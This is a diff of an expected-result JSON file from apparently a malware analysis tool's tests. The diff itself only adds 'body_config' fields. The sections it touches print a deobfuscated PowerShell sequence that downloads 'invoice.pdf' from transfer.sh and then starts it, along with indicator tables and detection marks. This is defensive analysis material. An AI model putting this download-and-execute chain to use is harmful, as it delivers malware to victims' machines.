@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": "[System.Net.WebClient.DownloadFile] Download From: http://deal.real --> Save To: ./C:/Users/Public/apple.png\n\n[System.Net.WebClient.DownloadFile] Download From: https://transfer.sh/get/vpiHmi/invoice.pdf --> Save To: C:ProgramDatainvoice.pdf\n\n[Start-Process] C:ProgramDatainvoice.pdf\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -46,6 +47,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"transfer.sh\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://transfer.sh/get/vpihmi/invoice.pdf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/get/vpihmi/invoice.pdf\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 1,
@@ -78,6 +85,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -89,6 +97,7 @@
       {
         "auto_collapse": false,
         "body": "Marks: Net.WebClient, DownloadFile",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -111,6 +120,7 @@
       {
         "auto_collapse": false,
         "body": "Marks: Start-Process",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -133,6 +143,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"transfer.sh\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://transfer.sh/get/vpihmi/invoice.pdf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/get/vpihmi/invoice.pdf\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
